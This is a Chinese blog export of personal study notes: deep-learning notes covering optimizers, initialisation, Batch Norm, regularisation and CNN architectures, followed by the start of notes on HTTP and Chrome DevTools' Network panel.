<p>PS：而反向传播将局部导数向正方向的反方向（从右到左）传递？？</p>
<h3 id="链式法则"><a href="#链式法则" class="headerlink" title="链式法则"></a>链式法则</h3><p>传递这个局部导数的原理，是基于链式法则（chain rule）的。</p>
<p>如果某个函数由复合函数表示，则该复合函数的导数可以用构成复合函数的各个函数的导数的乘积表示。</p>
<h4 id="计算图的反向传播"><a href="#计算图的反向传播" class="headerlink" title="计算图的反向传播"></a>计算图的反向传播</h4><p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/063.png" alt></p>
<p>计算图的反向传播：沿着与正方向相反的方向，乘上局部导数</p>
<h4 id="链式法则和计算图"><a href="#链式法则和计算图" class="headerlink" title="链式法则和计算图"></a>链式法则和计算图</h4><h3 id="反向传播"><a href="#反向传播" class="headerlink" title="反向传播"></a>反向传播</h3><h4 id="加法节点的反向传播"><a href="#加法节点的反向传播" class="headerlink" title="加法节点的反向传播"></a>加法节点的反向传播</h4><h2 id="day7-层卡"><a href="#day7-层卡" class="headerlink" title="day7 层卡"></a>day7 层卡</h2><h2 id="day8-参数技巧卡1"><a href="#day8-参数技巧卡1" class="headerlink" title="day8 参数技巧卡1"></a>day8 参数技巧卡1</h2><h3 id="参数的更新"><a href="#参数的更新" class="headerlink" title="参数的更新"></a>参数的更新</h3><p>神经网络的学习的目的是找到使损失函数的值尽可能小的参数。这是寻找最优参数的问题，解决这个问题的过程称为最优化（optimization）。</p>
<h4 id="SGD-随机梯度下降法（stochastic-gradient-descent）："><a href="#SGD-随机梯度下降法（stochastic-gradient-descent）：" class="headerlink" title="SGD 随机梯度下降法（stochastic gradient descent）："></a>SGD 随机梯度下降法（stochastic gradient descent）：</h4><p>为了找到最优参数，我们将参数的梯度（导数）作为了线索。使用参数的梯度，沿梯度方向更新参数，并重复这个步骤多次，从而逐渐靠近最优参数。</p>
<h4 id="SGD-的缺点："><a href="#SGD-的缺点：" class="headerlink" title="SGD 的缺点："></a>SGD 的缺点：</h4><p>如果函数的形状非均向（anisotropic），比如呈延伸状，搜索的路径就会非常低效。因此，我们需要比单纯朝梯度方向前进的 SGD 更聪明的方法。SGD 低效的根本原因是，梯度的方向并没有指向最小值的方向。</p>
<h4 id="Momentum"><a href="#Momentum" class="headerlink" title="Momentum"></a>Momentum</h4><h4 id="AdaGrad"><a href="#AdaGrad" class="headerlink" title="AdaGrad"></a>AdaGrad</h4><p>在神经网络的学习中，学习率（数学式中记为 η）的值很重要。学习率过小，会导致学习花费过多时间；反过来，学习率过大，则会导致学习发散而不能正确进行。</p>
<p>学习率衰减（learning rate decay）：<br>即随着学习的进行，使学习率逐渐减小。实际上，一开始“多”学，然后逐渐“少”学的方法，在神经网络的学习中经常被使用。</p>
<h4 id="Adam"><a href="#Adam" class="headerlink" title="Adam"></a>Adam</h4><p>Adam 是 2015 年提出的新方法。它的理论有些复杂，直观地讲，就是融合了 Momentum 和 AdaGrad 的方法。通过组合前面两个方法的优点，有望实现参数空间的高效搜索。此外，进行超参数的“偏置校正”也是 Adam 的特征。</p>
<h3 id="权重的初始值"><a href="#权重的初始值" class="headerlink" title="权重的初始值"></a>权重的初始值</h3><p>在神经网络的学习中，权重的初始值特别重要。实际上，设定什么样的权重初始值，经常关系到神经网络的学习能否成功。</p>
<p>为了防止“权重均一化”（严格地讲，是为了瓦解权重的对称结构），必须随机生成初始值。不可以将权重初始值设为 0 。</p>
<h4 id="隐藏层的激活值的分布"><a href="#隐藏层的激活值的分布" class="headerlink" title="隐藏层的激活值的分布"></a>隐藏层的激活值的分布</h4><p>梯度消失：<br><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/101.png" alt><br>各层的激活值呈偏向 0 和 1 的分布。这里使用的 sigmoid 函数是 S 型函数，随着输出不断地靠近 0（或者靠近 1），它的导数的值逐渐接近 0。因此，偏向 0 和 1 的数据分布会造成反向传播中梯度的值不断变小，最后消失。<br>层次加深的深度学习中，梯度消失的问题可能会更加严重。</p>
<h4 id="ReLU的权重初始值"><a href="#ReLU的权重初始值" class="headerlink" title="ReLU的权重初始值"></a>ReLU的权重初始值</h4><p>Xavier 初始值是以激活函数是线性函数为前提而推导出来的。因为 sigmoid 函数和 tanh 函数左右对称，且中央附近可以视作线性函数，所以适合使用 Xavier 初始值。但当激活函数使用 ReLU 时，一般推荐使用 ReLU 专用的初始值，也就是 Kaiming He 等人推荐的初始值，也称为“He 初始值”。</p>
<p>总结一下，当激活函数使用 ReLU 时，权重初始值使用 He 初始值，当激活函数为 sigmoid 或 tanh 等 S 型曲线函数时，初始值使用 Xavier 初始值。这是目前的最佳实践。(***)</p>
<h4 id="基于-MNIST-数据集的权重初始值的比较"><a href="#基于-MNIST-数据集的权重初始值的比较" class="headerlink" title="基于 MNIST 数据集的权重初始值的比较"></a>基于 MNIST 数据集的权重初始值的比较</h4><p>MNIST :<br>是深度学习的经典入门demo，他是由6万张训练图片和1万张测试图片构成的，每张图片都是28*28大小（如下图），而且都是黑白色构成（这里的黑色是一个0-1的浮点数，黑色越深表示数值越靠近1），这些图片是采集的不同的人手写从0到9的数字。TensorFlow将这个数据集和相关操作封装到了库中，下面我们来一步步解读深度学习MNIST的过程。</p>
<p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/106.png" alt></p>
<p>综上，在神经网络的学习中，权重初始值非常重要。很多时候权重初始值的设定关系到神经网络的学习能否成功。权重初始值的重要性容易被忽视，而任何事情的开始（初始值）总是关键的，因此在结束本节之际，再次强调一下权重初始值的重要性。</p>
<h3 id="Batch-Normalization"><a href="#Batch-Normalization" class="headerlink" title="Batch Normalization"></a>Batch Normalization</h3><h4 id="Batch-Normalization-的算法"><a href="#Batch-Normalization-的算法" class="headerlink" title="Batch Normalization 的算法"></a>Batch Normalization 的算法</h4><p>Batch Normalization（下文简称 Batch Norm）是 2015 年提出的方法。Batch Norm 虽然是一个问世不久的新方法，但已经被很多研究人员和技术人员广泛使用。实际上，看一下机器学习竞赛的结果，就会发现很多通过使用这个方法而获得优异结果的例子。</p>
<p>Batch Norm，顾名思义，以进行学习时的 mini-batch 为单位，按 mini-batch 进行正规化。具体而言，就是进行使数据分布的均值为 0、方差为 1 的正规化。用数学式表示的话，如下所示。</p>
<p><img data-src="https://images.gitbook.cn/c3a3c800-e7f3-11e8-89ee-f776175382b4" alt><br><img data-src="http://private.codecogs.com/gif.latex?y_i\leftarrow\gamma\hat{x}_i+\beta\quad\quad\quad\quad\quad(6.8%29" alt>)</p>
<p>Batch Normalization 的计算图（引用自文献 [13]）:</p>
<p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/108.png" alt></p>
<h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><p>可以使学习快速进行（可以增大学习率）。<br>不那么依赖初始值（对于初始值不用那么神经质）。<br>抑制过拟合（降低 Dropout 等的必要性）。</p>
<h4 id="Batch-Normalization的评估"><a href="#Batch-Normalization的评估" class="headerlink" title="Batch Normalization的评估"></a>Batch Normalization的评估</h4><p>综上，通过使用 Batch Norm，可以推动学习的进行。并且，对权重初始值变得健壮（“对初始值健壮”表示不那么依赖初始值）。Batch Norm 具备了如此优良的性质，一定能应用在更多场合中。</p>
<p>有点难吧   代码还没跑  好菜哦、、、、慢慢消化。。。。。</p>
<h2 id="day9-参数技巧卡2"><a href="#day9-参数技巧卡2" class="headerlink" title="day9 参数技巧卡2"></a>day9 参数技巧卡2</h2><h3 id="正则化"><a href="#正则化" class="headerlink" title="正则化"></a>正则化</h3><h4 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h4><p>过拟合指的是只能拟合训练数据，但不能很好地拟合不包含在训练数据中的其他数据的状态。机器学习的目标是提高泛化能力，即便是没有包含在训练数据里的未观测数据，也希望模型可以进行正确的识别。</p>
<p><strong>原因:</strong><br>模型拥有大量参数、表现力强。<br>训练数据少。</p>
<h4 id="权值衰减"><a href="#权值衰减" class="headerlink" title="权值衰减"></a>权值衰减</h4><p>权值衰减是一直以来经常被使用的一种抑制过拟合的方法。该方法通过在学习的过程中对大的权重进行惩罚，来抑制过拟合。很多过拟合原本就是因为权重参数取值过大才发生的。</p>
<p>但是，如果网络的模型变得很复杂，只用权值衰减就难以应对了。</p>
<h4 id="Dropout"><a href="#Dropout" class="headerlink" title="Dropout"></a>Dropout</h4><p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/113.png" alt></p>
<p>Dropout 是一种在学习的过程中随机删除神经元的方法。训练时，随机选出隐藏层的神经元，然后将其删除。被删除的神经元不再进行信号的传递。训练时，每传递一次数据，就会随机选择要删除的神经元。</p>
<p>这个集成学习与 Dropout 有密切的关系,神经网络的识别精度可以提高好几个百分点。</p>
<p>可以将 Dropout 理解为，通过在学习过程中随机删除神经元，从而每一次都让不同的模型进行学习。并且，推理时，通过对神经元的输出乘以删除比例（比如，0.5 等），可以取得模型的平均值。也就是说，可以理解成，Dropout将集成学习的效果（模拟地）通过一个网络实现了。</p>
<h3 id="超参数的验证"><a href="#超参数的验证" class="headerlink" title="超参数的验证"></a>超参数的验证</h3><h4 id="超参数（hyper-parameter）"><a href="#超参数（hyper-parameter）" class="headerlink" title="超参数（hyper-parameter）"></a>超参数（hyper-parameter）</h4><p>这里所说的超参数是指，比如各层的神经元数量、batch 大小、参数更新时的学习率或权值衰减等。如果这些超参数没有设置合适的值，模型的性能就会很差。</p>
<h4 id="验证数据"><a href="#验证数据" class="headerlink" title="验证数据"></a>验证数据</h4><p>用测试数据确认超参数的值的“好坏”，就会导致超参数的值被调整为只拟合测试数据。</p>
<p>根据不同的数据集，有的会事先分成训练数据、验证数据、测试数据三部分，有的只分成训练数据和测试数据两部分，有的则不进行分割。</p>
<h4 id="超参数的最优化"><a href="#超参数的最优化" class="headerlink" title="超参数的最优化"></a>超参数的最优化</h4><p>进行超参数的最优化时，逐渐缩小超参数的“好值”的存在范围非常重要。所谓逐渐缩小范围，是指一开始先大致设定一个范围，从这个范围中随机选出一个超参数（采样），用这个采样到的值进行识别精度的评估；然后，多次重复该操作，观察识别精度的结果，根据这个结果缩小超参数的“好值”的范围。通过重复这一操作，就可以逐渐确定超参数的合适范围。</p>
<h4 id="超参数的最优化的步骤"><a href="#超参数的最优化的步骤" class="headerlink" title="超参数的最优化的步骤"></a>超参数的最优化的步骤</h4><p>步骤 0</p>
<p>设定超参数的范围。</p>
<p>步骤 1</p>
<p>从设定的超参数范围中随机采样。</p>
<p>步骤 2</p>
<p>使用步骤 1 中采样到的超参数的值进行学习，通过验证数据评估识别精度（但是要将 epoch 设置得很小）。</p>
<p>步骤 3</p>
<p>重复步骤 1 和步骤 2（100 次等），根据它们的识别精度的结果，缩小超参数的范围。</p>
<h2 id="day10-CNN结构卡1"><a href="#day10-CNN结构卡1" class="headerlink" title="day10 CNN结构卡1"></a>day10 CNN结构卡1</h2><h3 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h3><p><strong>CNN :</strong></p>
<p>和之前介绍的神经网络一样，可以像乐高积木一样通过组装层来构建。不过，CNN 中新出现了卷积层（Convolution 层）和池化层（Pooling 层）。</p>
<p><strong>全连接（fully-connected）:</strong></p>
<p>相邻层的所有神经元之间都有连接。</p>
<p>基于全连接层（Affine 层）的网络的例子：</p>
<p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/116.png" alt></p>
<p>CNN 的一个例子:</p>
<p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/117.png" alt></p>
<p>CNN 的层的连接顺序是“Convolution - ReLU -（Pooling）”（Pooling 层有时会被省略）。</p>
<h3 id="卷积层"><a href="#卷积层" class="headerlink" title="卷积层"></a>卷积层</h3><h4 id="全连接层存在的问题"><a href="#全连接层存在的问题" class="headerlink" title="全连接层存在的问题"></a>全连接层存在的问题</h4><p>CNN 中，有时将卷积层的输入输出数据称为<strong>特征图（feature map）</strong>。其中，卷积层的输入数据称为<strong>输入特征图（input feature map）</strong>，输出数据称为<strong>输出特征图（output feature map）</strong>。</p>
<p>全连接层存在什么问题呢？那就是数据的形状被“忽视”了。比如，输入数据是图像时，图像通常是高、长、通道方向上的 3 维形状。但是，向全连接层输入时，需要将 3 维数据拉平为 1 维数据。</p>
<p>在 CNN 中，可以（有可能）正确理解图像等具有形状的数据。</p>
<h4 id="卷积运算"><a href="#卷积运算" class="headerlink" title="卷积运算"></a>卷积运算</h4><p>乘积累加运算：</p>
<p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/119.png" alt></p>
<h4 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h4><p>“幅度为 1 的填充”是指用幅度为 1 像素的 0 填充周围(图中用虚线表示填充，并省略了填充的内容“0”):</p>
<p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/121.png" alt></p>
<p><strong>为什么使用填充：</strong></p>
<p>因为如果每次进行卷积运算都会缩小空间，那么在某个时刻输出大小就有可能变为 1，导致无法再应用卷积运算。填充后卷积运算就可以在保持空间大小不变的情况下将数据传给下一层。</p>
<h4 id="步幅"><a href="#步幅" class="headerlink" title="步幅"></a>步幅</h4><p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/122.png" alt></p>
<p><strong>计算：</strong></p>
<p>假设输入大小为 (H, W)，滤波器大小为 (FH, FW)，输出大小为 (OH, OW)，填充为 P，步幅为 S。</p>
<p><img data-src="https://images.gitbook.cn/a19898a0-e7fb-11e8-89ee-f776175382b4" alt></p>
<h4 id="3-维数据的卷积运算"><a href="#3-维数据的卷积运算" class="headerlink" title="3 维数据的卷积运算"></a>3 维数据的卷积运算</h4><p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/124.png" alt></p>
<p>在 3 维数据的卷积运算中，输入数据和滤波器的通道数要设为相同的值,滤波器大小可以设定为任意值（不过，每个通道的滤波器大小要全部相同）。</p>
<h4 id="结合方块思考"><a href="#结合方块思考" class="headerlink" title="结合方块思考"></a>结合方块思考</h4><p>通道数为 C、高度为 H、长度为 W 的数据的形状可以写成（C, H, W）。滤波器也一样，要按（channel, height, width）的顺序书写。比如，通道数为 C、滤波器高度为 FH（Filter Height）、长度为 FW（Filter Width）时，可以写成（C, FH, FW）。</p>
<p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/125.png" alt><br><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/126.png" alt><br><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/127.png" alt></p>
<h4 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h4><p>神经网络的处理中进行了将输入数据打包的批处理。之前的全连接神经网络的实现也对应了批处理，通过批处理，能够实现处理的高效化和学习时对 mini-batch 的对应。</p>
<p>批处理将 N 次的处理汇总成了 1 次进行。</p>
<p>卷积运算也同样对应批处理，需要将在各层间传递的数据保存为 4 维数据。具体地讲，就是按 (batch_num, channel, height, width) 的顺序保存数据。</p>
<p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/128.png" alt></p>
<h2 id="day11-CNN结构卡2"><a href="#day11-CNN结构卡2" class="headerlink" title="day11 CNN结构卡2"></a>day11 CNN结构卡2</h2><h3 id="池化层"><a href="#池化层" class="headerlink" title="池化层"></a>池化层</h3><p>池化是缩小高、长方向上的空间的运算。</p>
<p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/129.png" alt></p>
<p><strong>ps:</strong><br>除了 Max 池化之外，还有 Average 池化等。相对于 Max 池化是从目标区域中取出最大值，Average 池化则是计算目标区域的平均值。在图像识别领域，主要使用 Max 池化。</p>
<h4 id="池化层的特征"><a href="#池化层的特征" class="headerlink" title="池化层的特征"></a>池化层的特征</h4><ul>
<li>没有要学习的参数</li>
</ul>
<p>池化层和卷积层不同，没有要学习的参数。池化只是从目标区域中取最大值（或者平均值），所以不存在要学习的参数。</p>
<ul>
<li>通道数不发生变化</li>
</ul>
<p>经过池化运算，输入数据和输出数据的通道数不会发生变化。</p>
<ul>
<li>对微小的位置变化具有鲁棒性（健壮）</li>
</ul>
<p>输入数据发生微小偏差时，池化仍会返回相同的结果。因此，池化对输入数据的微小偏差具有鲁棒性。</p>
<h3 id="卷积层和池化层的实现"><a href="#卷积层和池化层的实现" class="headerlink" title="卷积层和池化层的实现"></a>卷积层和池化层的实现</h3><h4 id="4-维数组"><a href="#4-维数组" class="headerlink" title="4 维数组"></a>4 维数组</h4><p>CNN 中各层间传递的数据是 4 维数据。所谓 4 维数据，比如数据的形状是 (10, 1, 28, 28)，则它对应 10 个高为 28、长为 28、通道为 1 的数据。</p>
<h4 id="基于-im2col-的展开"><a href="#基于-im2col-的展开" class="headerlink" title="基于 im2col 的展开"></a>基于 im2col 的展开</h4><p>im2col 是一个函数，将输入数据展开以适合滤波器（权重）。</p>
<p><strong>ps:</strong><br>NumPy 中存在使用 for 语句后处理变慢的缺点（NumPy 中，访问元素时最好不要用 for 语句）。</p>
<p>卷积运算的滤波器处理的细节：将滤波器纵向展开为 1 列，并计算和 im2col 展开的数据的矩阵乘积，最后转换（reshape）为输出数据的大小:<br><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/134.png" alt></p>
<h4 id="卷积层的实现"><a href="#卷积层的实现" class="headerlink" title="卷积层的实现"></a>卷积层的实现</h4><p>im2col 这一便捷函数具有以下接口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">im2col (input_data, filter_h, filter_w, stride=1, pad=0):</span><br><span class="line">input_data——由（数据量，通道，高，长）的 4 维数组构成的输入数据</span><br><span class="line">filter_h——滤波器的高</span><br><span class="line">filter_w——滤波器的长</span><br><span class="line">stride——步幅</span><br><span class="line">pad——填充</span><br></pre></td></tr></table></figure>
<p><strong>im2col</strong> 会考虑滤波器大小、步幅、填充，将输入数据展开为 2 维数组。</p>
<p>卷积层的初始化方法将滤波器（权重）、偏置、步幅、填充作为参数接收。滤波器是 (FN, C, FH, FW) 的 4 维形状。另外，FN、C、FH、FW 分别是 Filter Number（滤波器数量）、Channel、Filter Height、Filter Width 的缩写。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reshape(FN,-1) 将参数指定为 -1，这是 reshape 的一个便利的功能。通过在 reshape 时指定为 -1，reshape 函数会自动计算 -1 维度上的元素个数，以使多维数组的元素个数前后一致。比如，(10, 3, 5, 5) 形状的数组的元素个数共有 750 个，指定 reshape(10,-1) 后，就会转换成 (10, 75) 形状的数组。</span><br></pre></td></tr></table></figure>
<p><strong>transpose</strong> 会更改多维数组的轴的顺序。基于 NumPy 的 transpose 的轴顺序的更改：通过指定索引（编号），更改轴的顺序:<br><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/135.png" alt></p>
<h4 id="池化层的实现"><a href="#池化层的实现" class="headerlink" title="池化层的实现"></a>池化层的实现</h4><p>池化的情况下，在通道方向上是独立的。</p>
<p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/137.png" alt></p>
<p>池化层的实现按下面 3 个阶段进行。</p>
<ul>
<li>展开输入数据。</li>
<li>求各行的最大值。</li>
<li>转换为合适的输出大小。</li>
</ul>
<h2 id="day12-CNN实现卡"><a href="#day12-CNN实现卡" class="headerlink" title="day12 CNN实现卡"></a>day12 CNN实现卡</h2><h3 id="CNN-的实现"><a href="#CNN-的实现" class="headerlink" title="CNN 的实现"></a>CNN 的实现</h3><p>组合卷积层和池化层。</p>
<p><strong>“Convolution - ReLU - Pooling -Affine - ReLU - Affine - Softmax”的网络。</strong><br><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/138.png" alt></p>
<p>CNN 可以有效读取图像中的某种特性，在手写数字识别中，还可以实现高精度的识别。</p>
<h3 id="CNN-的可视化"><a href="#CNN-的可视化" class="headerlink" title="CNN 的可视化"></a>CNN 的可视化</h3><h4 id="第-1-层权重的可视化"><a href="#第-1-层权重的可视化" class="headerlink" title="第 1 层权重的可视化"></a>第 1 层权重的可视化</h4><p>卷积层的滤波器会提取边缘或斑块等原始信息。而刚才实现的 CNN 会将这些原始信息传递给后面的层。</p>
<p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/139.png" alt></p>
<p>学习前和学习后的第 1 层的卷积层的权重：虽然权重的元素是实数，但是在图像的显示上，统一将最小值显示为黑色（0），最大值显示为白色（255）。</p>
<p>学习前的滤波器是随机进行初始化的，所以在黑白的浓淡上没有规律可循，但学习后的滤波器变成了有规律的图像。<strong>有规律</strong>的滤波器在它在观察<strong>边缘</strong>（颜色变化的分界线）和<strong>斑块</strong>（局部的块状区域）等。</p>
<h4 id="基于分层结构的信息提取"><a href="#基于分层结构的信息提取" class="headerlink" title="基于分层结构的信息提取"></a>基于分层结构的信息提取</h4><p>一般物体识别（车或狗等）的 8 层 CNN。</p>
<p><strong>ps：</strong><br>AlexNet 网络结构堆叠了多层卷积层和池化层，最后经过全连接层输出结果。</p>
<p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/141.png" alt></p>
<p>第 1 层的神经元对边缘或斑块有响应，第 3 层对纹理有响应，第 5 层对物体部件有响应，最后的全连接层对物体的类别（狗或车）有响应。</p>
<p>最开始的层对简单的边缘有响应，接下来的层对纹理有响应，再后面的层对更加复杂的物体部件有响应。也就是说，<strong>随着层次加深，神经元从简单的形状向“高级”信息变化</strong>。</p>
<h3 id="具有代表性的-CNN"><a href="#具有代表性的-CNN" class="headerlink" title="具有代表性的 CNN"></a>具有代表性的 CNN</h3><p>CNN 元祖 LeNet；<br>AlexNet。</p>
<h4 id="LeNet"><a href="#LeNet" class="headerlink" title="LeNet"></a>LeNet</h4><p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/142.png" alt></p>
<h4 id="AlexNet"><a href="#AlexNet" class="headerlink" title="AlexNet"></a>AlexNet</h4><p>AlexNet 叠有多个卷积层和池化层，最后经由全连接层输出结果。</p>
<p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/143.png" alt></p>
<h4 id="AlexNet-和-LeNet-差异"><a href="#AlexNet-和-LeNet-差异" class="headerlink" title="AlexNet 和 LeNet 差异"></a>AlexNet 和 LeNet 差异</h4><ul>
<li>激活函数使用 ReLU。</li>
<li>使用进行局部正规化的 LRN（Local Response Normalization）层。</li>
<li>使用 Dropout（6.4.3 节）。</li>
</ul>
<h2 id="day13-深度学习"><a href="#day13-深度学习" class="headerlink" title="day13 深度学习"></a>day13 深度学习</h2><h3 id="加深网络"><a href="#加深网络" class="headerlink" title="加深网络"></a>加深网络</h3><h3 id="深度学习的小历史"><a href="#深度学习的小历史" class="headerlink" title="深度学习的小历史"></a>深度学习的小历史</h3><h4 id="VGG"><a href="#VGG" class="headerlink" title="VGG"></a>VGG</h4><p>VGG 是由卷积层和池化层构成的基础的 CNN。<br>它的特点在于将有权重的层（卷积层或者全连接层）叠加至 16 层（或者 19 层），具备了深度（根据层的深度，有时也称为“VGG16”或“VGG19”）。<br>VGG 中需要注意的地方是，基于 3×3 的小型滤波器的卷积层的运算是连续进行的。<br>重复进行“卷积层重叠 2 次到 4 次，再通过池化层将大小减半”的处理，最后经由全连接层输出结果。<br><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/152.png" alt></p>
<h4 id="GoogLeNet"><a href="#GoogLeNet" class="headerlink" title="GoogLeNet"></a>GoogLeNet</h4><p>GoogLeNet 的特征是，网络不仅在纵向上有深度，在横向上也有深度（广度）。GoogLeNet 在横向上有“宽度”，这称为“Inception 结构”，<br>Inception 结构使用了多个大小不同的滤波器（和池化），最后再合并它们的结果。GoogLeNet 的特征就是将这个 Inception 结构用作一个构件（构成元素）。<br>在 GoogLeNet 中，很多地方都使用了大小为 1 × 1 的滤波器的卷积层。这个 1 × 1 的卷积运算通过在通道方向上减小大小，有助于减少参数和实现高速化处理。</p>
<p><img data-src="http://www.ituring.com.cn/figures/2018/DeepLearning/153.png" alt></p>
<h4 id="ResNet"><a href="#ResNet" class="headerlink" title="ResNet"></a>ResNet</h4><p>ResNet 是微软团队开发的网络。它的特征在于具有比以前的网络更深的结构。</p>
<p>在深度学习中，过度加深层的话，很多情况下学习将不能顺利进行，导致最终性能不佳。ResNet 中，为了解决这类问题，导入了“快捷结构”（也称为“捷径”或“小路”）。</p>
<p>不太明白。。。。。。。。。</p>
<h3 id="深度学习的高速化"><a href="#深度学习的高速化" class="headerlink" title="深度学习的高速化"></a>深度学习的高速化</h3><p>GPU</p>
<p>分布式</p>
<p><strong>ps：</strong><br>计算机中表示小数时，有 32 位的单精度浮点数和 64 位的双精度浮点数等格式。根据以往的实验结果，在深度学习中，即便是 16 位的半精度浮点数（half float），也可以顺利地进行学习。</p>
<p>NumPy 中提供了 16 位的半精度浮点数类型（不过，只有 16 位类型的存储，运算本身不用 16 位进行），即便使用 NumPy 的半精度浮点数，识别精度也不会下降。</p>
]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>web协议详解与抓包实战</title>
    <url>/web%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%E4%B8%8E%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h2 id="基于-ABNF-语义定义的HTTP消息格式"><a href="#基于-ABNF-语义定义的HTTP消息格式" class="headerlink" title="基于 ABNF 语义定义的HTTP消息格式"></a>基于 ABNF 语义定义的HTTP消息格式</h2><p><a href="https://zh.wikipedia.org/wiki/%E6%89%A9%E5%85%85%E5%B7%B4%E7%A7%91%E6%96%AF%E8%8C%83%E5%BC%8F" target="_blank" rel="noopener">维基百科</a></p>
<h3 id="chrome-Network"><a href="#chrome-Network" class="headerlink" title="chrome Network"></a>chrome Network</h3><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>Elements（元素面板）：使用“元素”面板可以通过自由操纵DOM和CSS来重演您网站的布局和设计。</p>
<p>Console（控制台面板）：在开发期间，可以使用控制台面板记录诊断信息，或者使用它作为 shell，在页面上与JavaScript交互</p>
<p>Sources（源代码面板）：在源代码面板中设置断点来调试 JavaScript ，或者通过Workspaces（工作区）连接本地文件来使用开发者工具的实时编辑器</p>
<p>Network（网络面板）：从发起网页页面请求Request后得到的各个请求资源信息（包括状态、资源类型、大小、所用时间等），并可以根据这个进行网络性能优化</p>
<p>Performance（性能面板）：使用时间轴面板，可以通过记录和查看网站生命周期内发生的各种事件来提高页面运行时的性能</p>
<p>Memory（内存面板）：分析web应用或者页面的执行时间以及内存使用情况</p>
<p>Application（应用面板）：记录网站加载的所有资源信息，包括存储数据（Local Storage、Session Storage、-IndexedDB、Web SQL、Cookies）、缓存数据、字体、图片、脚本、样式表等</p>
<p>Security（安全面板）：使用安全面板调试混合内容问题，证书问题等等</p>
<p>Audits（审核面板）：对当前网页进行网络利用情况、网页性能方面的诊断，并给出一些优化建议。比如列出所有没有用到的CSS文件等<br><a id="more"></a></p>
<h4 id="Filters（过滤器）"><a href="#Filters（过滤器）" class="headerlink" title="Filters（过滤器）"></a>Filters（过滤器）</h4><p>domain：仅显示来自指定域的资源。您可以使用通配符（）来包括多个域。例如，.com显示以.com结尾的所有域名中的资源。 DevTools会在自动完成下拉菜单中自动填充它遇到的所有域。</p>
<p>has-response-header：显示包含指定HTTP响应头信息的资源。 DevTools会在自动完成下拉菜单中自动填充它遇到的所有响应头。</p>
<p>is：通过is:running找出WebSocket请求。</p>
<p>larger-than(大于)：显示大于指定大小的资源（以字节为单位）。设置值1000等效于设置值1k。</p>
<p>method(方法)：显示通过指定的HTTP方法类型检索的资源。DevTools使用它遇到的所有HTTP方法填充下拉列表。</p>
<p>mime-type（mime类型：显示指定MIME类型的资源。 DevTools使用它遇到的所有MIME类型填充下拉列表。</p>
<p>mixed-content（混合内容：显示所有混合内容资源（mixed-content:all）或仅显示当前显示的内容（mixed-content:displayed）。</p>
<p>Scheme（协议）：显示通过不受保护的HTTP（scheme:http）或受保护的HTTPS（scheme:https）检索的资源。</p>
<p>set-cookie-domain（cookie域）：显示具有Set-Cookie头,并且其Domain属性与指定值匹配的资源。DevTools会在自动完成下拉菜单中自动填充它遇到的所有Cookie域。</p>
<p>set-cookie-name（cookie名）：显示具有Set-Cookie头,并且名称与指定值匹配的资源。DevTools会在自动完成下拉菜单中自动填充它遇到的所有Cookie名。</p>
<p>set-cookie-value（cookie值）：显示具有Set-Cookie头,并且值与指定值匹配的资源。DevTools会在自动完成下拉菜单中自动填充它遇到的所有cookie值。</p>
<p>status-code（状态码）：仅显示其HTTP状态代码与指定代码匹配的资源。DevTools会在自动完成下拉菜单中自动填充它遇到的所有状态码。</p>
<h4 id="Controls（控件）"><a href="#Controls（控件）" class="headerlink" title="Controls（控件）"></a>Controls（控件）</h4><p>使用这些选项可以控制 Network(网络)面板的外观和功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Preserve log：是网络日志记录,如果勾上,页面刷新后,日志也不会消失(这功能很有用,比如页面跳转后,你想看页面跳转前发出的请求有哪些,比如查看别人网站登录请求,登录成功返回什么,登录成功后又发起了些什么请求,重定向到什么地址)</span><br><span class="line"></span><br><span class="line">Disable cache：缓存开关</span><br><span class="line"></span><br><span class="line">Online：网络控制</span><br><span class="line"></span><br><span class="line">Group by frame：勾选了该选项后,会对网络请求按表单名称进行分组</span><br></pre></td></tr></table></figure>
<h4 id="Overview（概览）"><a href="#Overview（概览）" class="headerlink" title="Overview（概览）"></a>Overview（概览）</h4><p>这个图表显示检索资源的时间轴。如果您看到多个垂直堆叠的栏，这意味着这些资源被同时检索。</p>
